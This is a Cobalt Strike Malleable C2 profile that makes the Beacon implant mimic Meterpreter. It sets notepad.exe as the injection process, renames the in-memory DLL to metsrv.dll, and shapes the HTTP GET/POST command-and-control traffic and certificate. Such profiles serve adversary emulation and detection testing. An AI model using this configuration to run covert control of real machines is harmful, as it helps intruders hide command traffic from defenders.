# Meterpreter profile
# 
# This was a fun exercise, make Beacon Meterpreter-like. :)
#
# https://www.metasploit.com/
# 

# 100ms sleep time. 
set sleeptime "100";

# what else would we spawn to?
set spawnto_x86 "%windir%\\syswow64\\notepad.exe";
set spawnto_x64 "%windir%\\sysnative\\notepad.exe";

# propagate user-agent to all transactions
set useragent "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";

# set some memory indicators to resemble the metasploit rDLL
stage {
	set compile_time "17 Feb 2017 19:34:11";
	set image_size_x86 "987136";
	set image_size_x64 "1232896";
	set userwx "true";

	transform-x86 {
		strrep "beacon.dll" "metsrv.dll";
	}

	transform-x64 {
		strrep "beacon.x64.dll" "metsrv.dll";
	}
}

# SSL cert
https-certificate {
	set O  "dmcjna";
	set CN "dmcjna";
	set validity "3285";
}

# staging process
http-stager {
	server {
		header "Content-Type" "application/octet-stream";
		header "Connection" "Keep-Alive";
		header "Server" "Apache";
	}
}

# HTTP GET
http-get {
	set uri "/ucD";

	client {
		header "Cache-Control" "no-cache";
		header "Connection" "Keep-Alive";
		header "Pragma" "no-cache";

		metadata {
			base64url;
			uri-append;
		}
	}

	server {
		header "Content-Type" "application/octet-stream";
		header "Connection" "Keep-Alive";
		header "Server" "Apache";

		output {
			print;
		}
	}
}

# HTTP POST
http-post {
	set uri "/ucW";

	client {
		header "Cache-Control" "no-cache";
		header "Connection" "Keep-Alive";
		header "Pragma" "no-cache";

		id {
			base64url;
			append "UMJjAiNUUtvNww0lBj9tzWegwphuIn6hNP9eeIDfOrcHJ3nozYFPT-Jl7WsmbmjZnQXUesoJkcJkpdYEdqgQFE6QZgjWVsLSSDonL28DYDVJ";
			uri-append;
		}

		output {
			print;
		}
	}

	# The server's response to our HTTP POST
	server {
		header "Content-Type" "application/octet-stream";
		header "Connection" "Keep-Alive";
		header "Server" "Apache";

		# this will just print an empty string, meh...
		output {
			print;
		}
	}
}
